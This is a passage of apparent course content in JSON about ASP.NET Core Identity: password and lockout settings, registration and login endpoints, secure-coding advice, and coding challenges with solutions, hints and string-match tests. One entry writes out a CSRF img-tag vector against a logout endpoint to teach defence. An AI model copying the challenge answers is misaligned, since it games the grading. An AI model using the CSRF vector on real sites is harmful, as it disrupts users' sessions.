              "solution": "using Microsoft.AspNetCore.Identity;\nusing Microsoft.AspNetCore.Identity.EntityFrameworkCore;\nusing Microsoft.EntityFrameworkCore;\n\npublic class ApplicationUser : IdentityUser\n{\n    public string FirstName { get; set; } = string.Empty;\n    public string LastName { get; set; } = string.Empty;\n    public DateTime CreatedAt { get; set; } = DateTime.UtcNow;\n}\n\npublic class ShopFlowDbContext : IdentityDbContext<ApplicationUser>\n{\n    public ShopFlowDbContext(DbContextOptions<ShopFlowDbContext> options)\n        : base(options) { }\n}\n\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddDbContext<ShopFlowDbContext>(options =>\n    options.UseInMemoryDatabase(\"ShopFlow\"));\n\nbuilder.Services.AddIdentity<ApplicationUser, IdentityRole>(options =>\n{\n    // Strict password policy\n    options.Password.RequiredLength = 14;\n    options.Password.RequireDigit = true;\n    options.Password.RequireLowercase = true;\n    options.Password.RequireUppercase = true;\n    options.Password.RequireNonAlphanumeric = true;\n    options.Password.RequiredUniqueChars = 6;\n    \n    // Lockout settings\n    options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(30);\n    options.Lockout.MaxFailedAccessAttempts = 3;\n    options.Lockout.AllowedForNewUsers = true;\n    \n    // User settings\n    options.User.RequireUniqueEmail = true;\n    \n    // Sign-in settings\n    options.SignIn.RequireConfirmedEmail = true;\n})\n.AddEntityFrameworkStores<ShopFlowDbContext>()\n.AddDefaultTokenProviders();\n\nvar app = builder.Build();\napp.Run();",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should configure password length of 14",
                  "expectedOutput": "RequiredLength = 14",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should configure lockout duration of 30 minutes",
                  "expectedOutput": "FromMinutes(30)",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Should require unique email",
                  "expectedOutput": "RequireUniqueEmail = true",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Should require confirmed email",
                  "expectedOutput": "RequireConfirmedEmail = true",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Start with builder.Services.AddIdentity<ApplicationUser, IdentityRole>() and pass a configuration lambda."
                },
                {
                  "level": 2,
                  "text": "Access password options via options.Password.RequiredLength, options.Password.RequireDigit, etc."
                },
                {
                  "level": 3,
                  "text": "Lockout options are under options.Lockout. Use TimeSpan.FromMinutes(30) for the duration."
                },
                {
                  "level": 4,
                  "text": "User options are under options.User, and sign-in options under options.SignIn."
                },
                {
                  "level": 5,
                  "text": "Don't forget to chain .AddEntityFrameworkStores<ShopFlowDbContext>() and .AddDefaultTokenProviders() after configuring options."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using AddDefaultIdentity instead of AddIdentity",
                  "consequence": "AddDefaultIdentity adds UI pages and is meant for Razor Pages. For APIs, use AddIdentity with manual configuration.",
                  "correction": "Use builder.Services.AddIdentity<ApplicationUser, IdentityRole>() for API-based applications."
                },
                {
                  "mistake": "Forgetting AddEntityFrameworkStores",
                  "consequence": "Identity has no data store configured and will throw runtime errors when trying to create or find users.",
                  "correction": "Always chain .AddEntityFrameworkStores<YourDbContext>() after configuring Identity options."
                },
                {
                  "mistake": "Not calling base.OnModelCreating in DbContext",
                  "consequence": "Identity tables are not configured in the database, causing EF Core errors.",
                  "correction": "Always call base.OnModelCreating(builder) in IdentityDbContext subclasses."
                },
                {
                  "mistake": "Setting password length too low for convenience",
                  "consequence": "Short passwords are easily cracked. 8 characters can be broken in hours.",
                  "correction": "Use at least 12-14 characters minimum. Modern guidance recommends even longer passphrases."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-20-03",
          "title": "Implementing Registration and Login Endpoints",
          "moduleId": "module-20",
          "order": 3,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "The Registration and Login Flow",
              "content": "Think of joining a premium gym. The registration process involves several careful steps. First, you fill out an application form with your personal details - name, email, emergency contact. The staff reviews your application, verifies your identity (perhaps by checking an ID card), and then creates your membership profile in their system. They issue you a membership card and explain the rules. Before your membership activates, you might need to confirm your email to receive your digital access credentials.\n\nThis is exactly how registration works in web applications. The user submits their information (registration form). Your application validates the data (is the email format correct? is the password strong enough?). If validation passes, the application creates a user record in the database using Identity's UserManager. An email confirmation is sent, and the user must verify their email before they can log in. The membership card is the authentication cookie or JWT token they will receive after successful login.\n\nNow consider the daily gym entry process. You swipe your membership card at the entrance. The system reads the card, checks if your membership is active, verifies you are not on a suspension list, and then unlocks the turnstile. If your card is invalid, expired, or you have too many failed swipes (maybe the card reader is dirty?), you are denied entry and must speak to staff.\n\nThis maps directly to login: the user provides credentials (the card swipe). SignInManager verifies the credentials against stored data (is this a valid member?). It checks account status (is the account locked? is email confirmed?). If everything checks out, it issues an authentication ticket (the turnstile unlocks). If validation fails, the system may lock the account after too many attempts.\n\nThe key insight is that registration is about creating a verified identity, while login is about proving you are that identity. Both processes must be secure, as weaknesses in either undermine your entire security model."
            },
            {
              "type": "EXAMPLE",
              "title": "Registration Endpoint",
              "content": "This example shows a complete registration endpoint using the CQRS pattern with MediatR, including validation, user creation, and email confirmation token generation.",
              "code": "// ===== REGISTRATION COMMAND =====\n// ShopFlow.Application/Features/Auth/Commands/RegisterCommand.cs\n\nusing MediatR;\nusing FluentValidation;\n\nnamespace ShopFlow.Application.Features.Auth.Commands;\n\npublic record RegisterCommand(\n    string Email,\n    string Password,\n    string ConfirmPassword,\n    string FirstName,\n    string LastName,\n    DateTime DateOfBirth\n) : IRequest<RegisterResult>;\n\npublic record RegisterResult(\n    bool Succeeded,\n    string? UserId,\n    string? EmailConfirmationToken,\n    IEnumerable<string> Errors\n);\n\n// ===== REGISTRATION VALIDATOR =====\n// ShopFlow.Application/Features/Auth/Commands/RegisterCommandValidator.cs\n\npublic class RegisterCommandValidator : AbstractValidator<RegisterCommand>\n{\n    public RegisterCommandValidator()\n    {\n        RuleFor(x => x.Email)\n            .NotEmpty().WithMessage(\"Email is required\")\n            .EmailAddress().WithMessage(\"Invalid email format\")\n            .MaximumLength(256).WithMessage(\"Email must not exceed 256 characters\");\n        \n        RuleFor(x => x.Password)\n            .NotEmpty().WithMessage(\"Password is required\")\n            .MinimumLength(14).WithMessage(\"Password must be at least 14 characters\")\n            .Matches(\"[A-Z]\").WithMessage(\"Password must contain uppercase letter\")\n            .Matches(\"[a-z]\").WithMessage(\"Password must contain lowercase letter\")\n            .Matches(\"[0-9]\").WithMessage(\"Password must contain a digit\")\n            .Matches(\"[^a-zA-Z0-9]\").WithMessage(\"Password must contain special character\");\n        \n        RuleFor(x => x.ConfirmPassword)\n            .Equal(x => x.Password).WithMessage(\"Passwords do not match\");\n        \n        RuleFor(x => x.FirstName)\n            .NotEmpty().WithMessage(\"First name is required\")\n            .MaximumLength(100).WithMessage(\"First name must not exceed 100 characters\");\n        \n        RuleFor(x => x.LastName)\n            .NotEmpty().WithMessage(\"Last name is required\")\n            .MaximumLength(100).WithMessage(\"Last name must not exceed 100 characters\");\n        \n        RuleFor(x => x.DateOfBirth)\n            .NotEmpty().WithMessage(\"Date of birth is required\")\n            .Must(BeAtLeast18YearsOld).WithMessage(\"You must be at least 18 years old\");\n    }\n    \n    private static bool BeAtLeast18YearsOld(DateTime dateOfBirth)\n    {\n        var today = DateTime.Today;\n        var age = today.Year - dateOfBirth.Year;\n        if (dateOfBirth > today.AddYears(-age)) age--;\n        return age >= 18;\n    }\n}\n\n// ===== REGISTRATION HANDLER =====\n// ShopFlow.Application/Features/Auth/Commands/RegisterHandler.cs\n\nusing Microsoft.AspNetCore.Identity;\nusing Microsoft.Extensions.Logging;\nusing ShopFlow.Domain.Entities;\n\nnamespace ShopFlow.Application.Features.Auth.Commands;\n\npublic class RegisterHandler : IRequestHandler<RegisterCommand, RegisterResult>\n{\n    private readonly UserManager<ApplicationUser> _userManager;\n    private readonly ILogger<RegisterHandler> _logger;\n    \n    public RegisterHandler(\n        UserManager<ApplicationUser> userManager,\n        ILogger<RegisterHandler> logger)\n    {\n        _userManager = userManager;\n        _logger = logger;\n    }\n    \n    public async Task<RegisterResult> Handle(\n        RegisterCommand request,\n        CancellationToken cancellationToken)\n    {\n        // Check if user already exists\n        var existingUser = await _userManager.FindByEmailAsync(request.Email);\n        if (existingUser is not null)\n        {\n            _logger.LogWarning(\n                \"Registration attempted for existing email: {Email}\",\n                request.Email);\n            \n            // Security: Don't reveal that email exists!\n            // Return generic error\n            return new RegisterResult(\n                Succeeded: false,\n                UserId: null,\n                EmailConfirmationToken: null,\n                Errors: [\"Registration failed. Please check your information.\"]\n            );\n        }\n        \n        // Create new user\n        var user = new ApplicationUser\n        {\n            UserName = request.Email,  // Use email as username\n            Email = request.Email,\n            FirstName = request.FirstName,\n            LastName = request.LastName,\n            DateOfBirth = request.DateOfBirth,\n            CreatedAt = DateTime.UtcNow\n        };\n        \n        // Create user with password (Identity handles hashing)\n        var result = await _userManager.CreateAsync(user, request.Password);\n        \n        if (!result.Succeeded)\n        {\n            _logger.LogWarning(\n                \"User registration failed for {Email}: {Errors}\",\n                request.Email,\n                string.Join(\", \", result.Errors.Select(e => e.Description)));\n            \n            return new RegisterResult(\n                Succeeded: false,\n                UserId: null,\n                EmailConfirmationToken: null,\n                Errors: result.Errors.Select(e => e.Description)\n            );\n        }\n        \n        // Assign default role\n        await _userManager.AddToRoleAsync(user, \"Customer\");\n        \n        // Generate email confirmation token\n        var emailToken = await _userManager.GenerateEmailConfirmationTokenAsync(user);\n        \n        _logger.LogInformation(\n            \"User registered successfully: {UserId} ({Email})\",\n            user.Id,\n            user.Email);\n        \n        return new RegisterResult(\n            Succeeded: true,\n            UserId: user.Id,\n            EmailConfirmationToken: emailToken,\n            Errors: []\n        );\n    }\n}\n\n// ===== API ENDPOINT =====\n// ShopFlow.Api/Endpoints/AuthEndpoints.cs\n\nusing MediatR;\nusing Microsoft.AspNetCore.Mvc;\nusing ShopFlow.Application.Features.Auth.Commands;\n\nnamespace ShopFlow.Api.Endpoints;\n\npublic static class AuthEndpoints\n{\n    public static void MapAuthEndpoints(this IEndpointRouteBuilder routes)\n    {\n        var group = routes.MapGroup(\"/api/auth\").WithTags(\"Authentication\");\n        \n        group.MapPost(\"/register\", Register)\n            .WithName(\"Register\")\n            .WithSummary(\"Register a new user account\")\n            .Produces<RegisterResponse>(StatusCodes.Status201Created)\n            .ProducesValidationProblem()\n            .AllowAnonymous();\n    }\n    \n    private static async Task<IResult> Register(\n        [FromBody] RegisterRequest request,\n        [FromServices] ISender sender,\n        [FromServices] IEmailService emailService,\n        HttpContext httpContext)\n    {\n        var command = new RegisterCommand(\n            Email: request.Email,\n            Password: request.Password,\n            ConfirmPassword: request.ConfirmPassword,\n            FirstName: request.FirstName,\n            LastName: request.LastName,\n            DateOfBirth: request.DateOfBirth\n        );\n        \n        var result = await sender.Send(command);\n        \n        if (!result.Succeeded)\n        {\n            return Results.BadRequest(new { Errors = result.Errors });\n        }\n        \n        // Send confirmation email\n        var confirmationLink = $\"{httpContext.Request.Scheme}://{httpContext.Request.Host}\" +\n            $\"/api/auth/confirm-email?userId={result.UserId}&token={Uri.EscapeDataString(result.EmailConfirmationToken!)}\";\n        \n        await emailService.SendEmailConfirmationAsync(\n            request.Email,\n            request.FirstName,\n            confirmationLink);\n        \n        return Results.Created(\n            $\"/api/users/{result.UserId}\",\n            new RegisterResponse(\n                Message: \"Registration successful. Please check your email to confirm your account.\"\n            ));\n    }\n}\n\npublic record RegisterRequest(\n    string Email,\n    string Password,\n    string ConfirmPassword,\n    string FirstName,\n    string LastName,\n    DateTime DateOfBirth\n);\n\npublic record RegisterResponse(string Message);",
              "language": "csharp"
            },
            {
              "type": "EXAMPLE",
              "title": "Login Endpoint with Cookie",
              "content": "This example demonstrates a secure login endpoint that validates credentials, handles lockout, and issues an authentication cookie.",
              "code": "// ===== LOGIN COMMAND =====\n// ShopFlow.Application/Features/Auth/Commands/LoginCommand.cs\n\nusing MediatR;\nusing System.Security.Claims;\n\nnamespace ShopFlow.Application.Features.Auth.Commands;\n\npublic record LoginCommand(\n    string Email,\n    string Password,\n    bool RememberMe\n) : IRequest<LoginResult>;\n\npublic record LoginResult(\n    bool Succeeded,\n    string? UserId,\n    string? DisplayName,\n    IEnumerable<string> Roles,\n    LoginFailureReason? FailureReason,\n    string? Message\n);\n\npublic enum LoginFailureReason\n{\n    InvalidCredentials,\n    AccountLockedOut,\n    EmailNotConfirmed,\n    AccountDisabled\n}\n\n// ===== LOGIN HANDLER =====\n// ShopFlow.Application/Features/Auth/Commands/LoginHandler.cs\n\nusing Microsoft.AspNetCore.Identity;\nusing Microsoft.Extensions.Logging;\nusing ShopFlow.Domain.Entities;\n\nnamespace ShopFlow.Application.Features.Auth.Commands;\n\npublic class LoginHandler : IRequestHandler<LoginCommand, LoginResult>\n{\n    private readonly UserManager<ApplicationUser> _userManager;\n    private readonly SignInManager<ApplicationUser> _signInManager;\n    private readonly ILogger<LoginHandler> _logger;\n    \n    public LoginHandler(\n        UserManager<ApplicationUser> userManager,\n        SignInManager<ApplicationUser> signInManager,\n        ILogger<LoginHandler> logger)\n    {\n        _userManager = userManager;\n        _signInManager = signInManager;\n        _logger = logger;\n    }\n    \n    public async Task<LoginResult> Handle(\n        LoginCommand request,\n        CancellationToken cancellationToken)\n    {\n        // Find user by email\n        var user = await _userManager.FindByEmailAsync(request.Email);\n        \n        if (user is null)\n        {\n            _logger.LogWarning(\n                \"Login attempt for non-existent email: {Email}\",\n                request.Email);\n            \n            // Security: Don't reveal that user doesn't exist!\n            // Use same response as invalid password\n            return FailedLogin(LoginFailureReason.InvalidCredentials);\n        }\n        \n        // Check if account is disabled\n        if (!user.IsActive)\n        {\n            _logger.LogWarning(\n                \"Login attempt for disabled account: {UserId}\",\n                user.Id);\n            \n            return FailedLogin(LoginFailureReason.AccountDisabled);\n        }\n        \n        // Check if account is locked out\n        if (await _userManager.IsLockedOutAsync(user))\n        {\n            _logger.LogWarning(\n                \"Login attempt for locked account: {UserId}\",\n                user.Id);\n            \n            var lockoutEnd = await _userManager.GetLockoutEndDateAsync(user);\n            return new LoginResult(\n                Succeeded: false,\n                UserId: null,\n                DisplayName: null,\n                Roles: [],\n                FailureReason: LoginFailureReason.AccountLockedOut,\n                Message: $\"Account is locked. Try again after {lockoutEnd?.LocalDateTime}\"\n            );\n        }\n        \n        // Check if email is confirmed\n        if (!await _userManager.IsEmailConfirmedAsync(user))\n        {\n            _logger.LogWarning(\n                \"Login attempt with unconfirmed email: {UserId}\",\n                user.Id);\n            \n            return FailedLogin(LoginFailureReason.EmailNotConfirmed);\n        }\n        \n        // Attempt sign-in (this handles password verification and lockout)\n        var result = await _signInManager.PasswordSignInAsync(\n            user,\n            request.Password,\n            isPersistent: request.RememberMe,\n            lockoutOnFailure: true);\n        \n        if (result.Succeeded)\n        {\n            // Update last login timestamp\n            user.LastLoginAt = DateTime.UtcNow;\n            await _userManager.UpdateAsync(user);\n            \n            // Get user roles\n            var roles = await _userManager.GetRolesAsync(user);\n            \n            _logger.LogInformation(\n                \"User logged in successfully: {UserId} ({Email})\",\n                user.Id,\n                user.Email);\n            \n            return new LoginResult(\n                Succeeded: true,\n                UserId: user.Id,\n                DisplayName: user.FullName,\n                Roles: roles,\n                FailureReason: null,\n                Message: \"Login successful\"\n            );\n        }\n        \n        if (result.IsLockedOut)\n        {\n            _logger.LogWarning(\n                \"Account locked after failed attempts: {UserId}\",\n                user.Id);\n            \n            return new LoginResult(\n                Succeeded: false,\n                UserId: null,\n                DisplayName: null,\n                Roles: [],\n                FailureReason: LoginFailureReason.AccountLockedOut,\n                Message: \"Account locked due to multiple failed attempts. Try again later.\"\n            );\n        }\n        \n        if (result.RequiresTwoFactor)\n        {\n            // Handle 2FA - covered in advanced lesson\n            _logger.LogInformation(\n                \"2FA required for user: {UserId}\",\n                user.Id);\n            \n            return new LoginResult(\n                Succeeded: false,\n                UserId: user.Id,\n                DisplayName: null,\n                Roles: [],\n                FailureReason: null,\n                Message: \"Two-factor authentication required\"\n            );\n        }\n        \n        // Password was incorrect\n        _logger.LogWarning(\n            \"Failed login attempt for user: {UserId}\",\n            user.Id);\n        \n        return FailedLogin(LoginFailureReason.InvalidCredentials);\n    }\n    \n    private static LoginResult FailedLogin(LoginFailureReason reason) =>\n        new(\n            Succeeded: false,\n            UserId: null,\n            DisplayName: null,\n            Roles: [],\n            FailureReason: reason,\n            Message: reason switch\n            {\n                LoginFailureReason.InvalidCredentials => \"Invalid email or password\",\n                LoginFailureReason.AccountLockedOut => \"Account is temporarily locked\",\n                LoginFailureReason.EmailNotConfirmed => \"Please confirm your email before logging in\",\n                LoginFailureReason.AccountDisabled => \"This account has been disabled\",\n                _ => \"Login failed\"\n            }\n        );\n}\n\n// ===== API ENDPOINT =====\n// Add to AuthEndpoints.cs\n\ngroup.MapPost(\"/login\", Login)\n    .WithName(\"Login\")\n    .WithSummary(\"Authenticate user and create session\")\n    .Produces<LoginResponse>(StatusCodes.Status200OK)\n    .Produces(StatusCodes.Status401Unauthorized)\n    .Produces(StatusCodes.Status423Locked)  // Account locked\n    .AllowAnonymous();\n\nprivate static async Task<IResult> Login(\n    [FromBody] LoginRequest request,\n    [FromServices] ISender sender)\n{\n    var command = new LoginCommand(\n        Email: request.Email,\n        Password: request.Password,\n        RememberMe: request.RememberMe\n    );\n    \n    var result = await sender.Send(command);\n    \n    if (!result.Succeeded)\n    {\n        return result.FailureReason switch\n        {\n            LoginFailureReason.AccountLockedOut =>\n                Results.Problem(\n                    statusCode: StatusCodes.Status423Locked,\n                    title: \"Account Locked\",\n                    detail: result.Message),\n            \n            LoginFailureReason.EmailNotConfirmed =>\n                Results.Problem(\n                    statusCode: StatusCodes.Status403Forbidden,\n                    title: \"Email Not Confirmed\",\n                    detail: result.Message),\n            \n            _ => Results.Unauthorized()\n        };\n    }\n    \n    return Results.Ok(new LoginResponse(\n        UserId: result.UserId!,\n        DisplayName: result.DisplayName!,\n        Roles: result.Roles\n    ));\n}\n\npublic record LoginRequest(\n    string Email,\n    string Password,\n    bool RememberMe = false\n);\n\npublic record LoginResponse(\n    string UserId,\n    string DisplayName,\n    IEnumerable<string> Roles\n);",
              "language": "csharp"
            },
            {
              "type": "WARNING",
              "title": "Security Best Practices",
              "content": "## Critical Security Practices for Authentication Endpoints\n\n### Never Reveal User Existence\n\n**The Mistake:** Returning different error messages for 'email not found' versus 'wrong password'. Attackers can use this to enumerate valid email addresses in your system.\n\n**Example of Bad Practice:**\n```csharp\n// DON'T DO THIS!\nif (user is null)\n    return BadRequest(\"User not found\");\nif (!passwordValid)\n    return BadRequest(\"Incorrect password\");\n```\n\n**The Risk:** An attacker tries logging in with 'admin@company.com'. If they get 'User not found', they know that email does not exist. If they get 'Incorrect password', they know the email IS valid and can now focus on cracking just the password.\n\n**The Fix:** Always return the same generic message:\n```csharp\n// CORRECT - same message for both cases\nif (user is null || !passwordValid)\n    return Unauthorized(\"Invalid email or password\");\n```\n\nThis applies to registration too - if a user tries to register with an existing email, do not say 'email already registered'. Instead, pretend registration succeeded and send an email to the existing user saying 'someone tried to create an account with your email'.\n\n### Implement Rate Limiting\n\n**The Mistake:** Allowing unlimited login attempts from the same IP or for the same account.\n\n**The Risk:** Even with account lockout after 5 failed attempts, an attacker can try 5 passwords on millions of accounts, or use distributed IPs to bypass IP-based limits.\n\n**The Fix:** Implement multiple layers of rate limiting:\n```csharp\n// In Program.cs\nbuilder.Services.AddRateLimiter(options =>\n{\n    // Per-IP limit for login endpoint\n    options.AddFixedWindowLimiter(\"login\", opt =>\n    {\n        opt.PermitLimit = 10;\n        opt.Window = TimeSpan.FromMinutes(1);\n        opt.QueueProcessingOrder = QueueProcessingOrder.OldestFirst;\n        opt.QueueLimit = 2;\n    });\n});\n\n// Apply to endpoint\ngroup.MapPost(\"/login\", Login)\n    .RequireRateLimiting(\"login\");\n```\n\nCombine with:\n- Account lockout (Identity's built-in feature)\n- CAPTCHA after several failed attempts\n- Increasing delays between attempts (exponential backoff)\n- Alerting on distributed attack patterns\n\n### Always Use HTTPS\n\n**The Mistake:** Running authentication endpoints over HTTP, even in development.\n\n**The Risk:** Credentials sent over HTTP can be intercepted by anyone on the network. This includes coffee shop WiFi, corporate networks, and ISPs.\n\n**The Fix:** Force HTTPS everywhere:\n```csharp\n// In Program.cs\napp.UseHttpsRedirection();\n\n// Configure cookies for HTTPS only\nbuilder.Services.ConfigureApplicationCookie(options =>\n{\n    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;\n});\n\n// Reject non-HTTPS in production\nif (!app.Environment.IsDevelopment())\n{\n    app.Use(async (context, next) =>\n    {\n        if (!context.Request.IsHttps)\n        {\n            context.Response.StatusCode = 400;\n            await context.Response.WriteAsync(\"HTTPS required\");\n            return;\n        }\n        await next();\n    });\n}\n```\n\n### Validate Input Thoroughly\n\n**The Mistake:** Trusting client-side validation or only validating on the happy path.\n\n**The Risk:** Attackers bypass client-side validation easily. Malformed input can cause unexpected behavior, SQL injection, or denial of service.\n\n**The Fix:** Validate everything server-side:\n```csharp\npublic class RegisterCommandValidator : AbstractValidator<RegisterCommand>\n{\n    public RegisterCommandValidator()\n    {\n        // Email: format, length, not empty\n        RuleFor(x => x.Email)\n            .NotEmpty()\n            .EmailAddress()\n            .MaximumLength(256);\n        \n        // Password: complexity requirements\n        RuleFor(x => x.Password)\n            .NotEmpty()\n            .MinimumLength(14)\n            .Matches(\"[A-Z]\")\n            .Matches(\"[a-z]\")\n            .Matches(\"[0-9]\")\n            .Matches(\"[^a-zA-Z0-9]\");\n        \n        // Names: prevent script injection\n        RuleFor(x => x.FirstName)\n            .NotEmpty()\n            .MaximumLength(100)\n            .Matches(\"^[a-zA-Z\\\\s'-]+$\")\n            .WithMessage(\"Name contains invalid characters\");\n    }\n}\n```\n\n### Log Security Events\n\n**The Mistake:** Not logging authentication events, or logging sensitive data like passwords.\n\n**The Risk:** Without logs, you cannot detect attacks, investigate breaches, or meet compliance requirements. Logging passwords creates a massive security hole.\n\n**The Fix:** Log security events without sensitive data:\n```csharp\n// Log successful login\n_logger.LogInformation(\n    \"User logged in: {UserId} from IP {IpAddress} at {Timestamp}\",\n    user.Id,\n    httpContext.Connection.RemoteIpAddress,\n    DateTime.UtcNow);\n\n// Log failed attempts (for detecting attacks)\n_logger.LogWarning(\n    \"Failed login attempt for email {Email} from IP {IpAddress}\",\n    request.Email,  // OK to log\n    httpContext.Connection.RemoteIpAddress);\n\n// NEVER log passwords!\n// _logger.LogDebug(\"Login with password: {Password}\", request.Password); // NEVER!\n```\n\nConsider sending alerts for:\n- Multiple failed logins to the same account\n- Logins from new locations\n- Logins at unusual times\n- Password changes"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-20-03-challenge-01",
              "title": "Implement Logout Endpoint",
              "description": "Create a secure logout endpoint that properly terminates the user session.",
              "instructions": "Implement a logout endpoint for ShopFlow!\n\n1. Create a LogoutHandler that:\n   - Uses SignInManager to sign out the user\n   - Logs the logout event with user ID and timestamp\n   - Returns a success result\n\n2. Create the logout API endpoint:\n   - Route: POST /api/auth/logout\n   - Require authentication (user must be logged in to log out)\n   - Return 200 OK with a success message\n\n3. Important considerations:\n   - Use SignInManager<ApplicationUser>.SignOutAsync()\n   - Get the current user ID from HttpContext.User\n   - Log the logout event for security auditing\n\nHint: The logout endpoint should be a POST, not GET, to prevent CSRF attacks via image tags or links.",
              "starterCode": "using MediatR;\nusing Microsoft.AspNetCore.Identity;\nusing Microsoft.Extensions.Logging;\nusing System.Security.Claims;\n\n// Assume ApplicationUser is already defined\npublic class ApplicationUser : IdentityUser\n{\n    public string FirstName { get; set; } = string.Empty;\n    public string LastName { get; set; } = string.Empty;\n}\n\n// TODO: Create LogoutCommand (IRequest<LogoutResult>)\n// It needs the current user's ID\n\n// TODO: Create LogoutResult record\n// - Succeeded (bool)\n// - Message (string)\n\n// TODO: Create LogoutHandler (IRequestHandler<LogoutCommand, LogoutResult>)\n// - Inject SignInManager<ApplicationUser> and ILogger\n// - Call SignOutAsync()\n// - Log the logout event\n// - Return success result\n\n// API Endpoint setup\nvar builder = WebApplication.CreateBuilder(args);\n\n// Assume Identity is configured...\nbuilder.Services.AddMediatR(cfg => cfg.RegisterServicesFromAssembly(typeof(Program).Assembly));\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\n// TODO: Map POST /api/auth/logout endpoint\n// - Require authorization\n// - Get user ID from HttpContext.User\n// - Send LogoutCommand\n// - Return appropriate response\n\napp.Run();",
              "solution": "using MediatR;\nusing Microsoft.AspNetCore.Identity;\nusing Microsoft.Extensions.Logging;\nusing System.Security.Claims;\n\npublic class ApplicationUser : IdentityUser\n{\n    public string FirstName { get; set; } = string.Empty;\n    public string LastName { get; set; } = string.Empty;\n}\n\npublic record LogoutCommand(string UserId) : IRequest<LogoutResult>;\n\npublic record LogoutResult(bool Succeeded, string Message);\n\npublic class LogoutHandler : IRequestHandler<LogoutCommand, LogoutResult>\n{\n    private readonly SignInManager<ApplicationUser> _signInManager;\n    private readonly ILogger<LogoutHandler> _logger;\n    \n    public LogoutHandler(\n        SignInManager<ApplicationUser> signInManager,\n        ILogger<LogoutHandler> logger)\n    {\n        _signInManager = signInManager;\n        _logger = logger;\n    }\n    \n    public async Task<LogoutResult> Handle(\n        LogoutCommand request,\n        CancellationToken cancellationToken)\n    {\n        await _signInManager.SignOutAsync();\n        \n        _logger.LogInformation(\n            \"User logged out: {UserId} at {Timestamp}\",\n            request.UserId,\n            DateTime.UtcNow);\n        \n        return new LogoutResult(\n            Succeeded: true,\n            Message: \"You have been logged out successfully\"\n        );\n    }\n}\n\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddMediatR(cfg => cfg.RegisterServicesFromAssembly(typeof(Program).Assembly));\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\napp.MapPost(\"/api/auth/logout\", async (\n    HttpContext httpContext,\n    ISender sender) =>\n{\n    var userId = httpContext.User.FindFirstValue(ClaimTypes.NameIdentifier);\n    \n    if (string.IsNullOrEmpty(userId))\n    {\n        return Results.Unauthorized();\n    }\n    \n    var result = await sender.Send(new LogoutCommand(userId));\n    \n    return Results.Ok(new { result.Message });\n})\n.RequireAuthorization()\n.WithName(\"Logout\")\n.WithTags(\"Authentication\");\n\napp.Run();",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should call SignOutAsync",
                  "expectedOutput": "SignOutAsync",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should log the logout event",
                  "expectedOutput": "LogInformation",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Should require authorization",
                  "expectedOutput": "RequireAuthorization",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Should use POST method",
                  "expectedOutput": "MapPost",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Create a simple LogoutCommand record that takes the user's ID as a parameter."
                },
                {
                  "level": 2,
                  "text": "Inject SignInManager<ApplicationUser> into your handler and call SignOutAsync()."
                },
                {
                  "level": 3,
                  "text": "Get the user ID from HttpContext.User.FindFirstValue(ClaimTypes.NameIdentifier)."
                },
                {
                  "level": 4,
                  "text": "Use MapPost for the logout endpoint and chain .RequireAuthorization() to ensure only authenticated users can log out."
                },
                {
                  "level": 5,
                  "text": "Use ILogger.LogInformation to log the logout event with the user ID and timestamp."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using GET instead of POST for logout",
                  "consequence": "Attackers can log users out by embedding <img src='/api/auth/logout'> in a page. This is a CSRF vulnerability.",
                  "correction": "Always use POST for logout endpoints. This requires an intentional form submission or JavaScript fetch call."
                },
                {
                  "mistake": "Not requiring authentication for logout",
                  "consequence": "Anonymous users can hit the logout endpoint, which might cause errors or unexpected behavior.",
                  "correction": "Add .RequireAuthorization() to ensure only authenticated users can access the logout endpoint."
                },
                {
                  "mistake": "Forgetting to await SignOutAsync",
                  "consequence": "The sign-out may not complete before the response is sent, potentially leaving the user still logged in.",
                  "correction": "Always await SignOutAsync() to ensure the sign-out completes before returning a response."
                },
                {
                  "mistake": "Not logging the logout event",
                  "consequence": "You lose security audit trail. Cannot track suspicious logout patterns or investigate incidents.",
                  "correction": "Log all authentication events including logouts with user ID, timestamp, and IP address."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-20-04",
          "title": "JWT Tokens for API Authentication",
          "moduleId": "module-20",
          "order": 4,
          "estimatedMinutes": 45,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "JWT as a Boarding Pass",
              "content": "When you check in for a flight, the airline verifies your identity against your passport and booking. Once verified, they issue you a boarding pass. This boarding pass contains key information: your name, flight number, seat assignment, boarding time, and a barcode the airline can scan. You do not need to show your passport again at every checkpoint - the boarding pass proves you have already been verified.\n\nA JWT (JSON Web Token) is exactly like this boarding pass. After you log in and prove your identity (like showing your passport), the server issues you a JWT. This token contains claims about you - your user ID, roles, email, and when the token expires. Just like the boarding pass, you present this token with each request instead of re-entering your password every time.\n\nLet us break down the boarding pass analogy further to understand JWT structure:\n\n**The Header (Top of boarding pass - airline logo and barcode type)**\nThe JWT header specifies the token type (JWT) and the signing algorithm (like HS256 or RS256). This tells the receiving system how to validate the token. On a boarding pass, this is like the barcode format that scanners need to know how to read.\n\n**The Payload (Main boarding pass info - your details)**\nThe payload contains claims - statements about the user. Standard claims include 'sub' (subject - who the token is about), 'exp' (expiration time), 'iat' (issued at), and 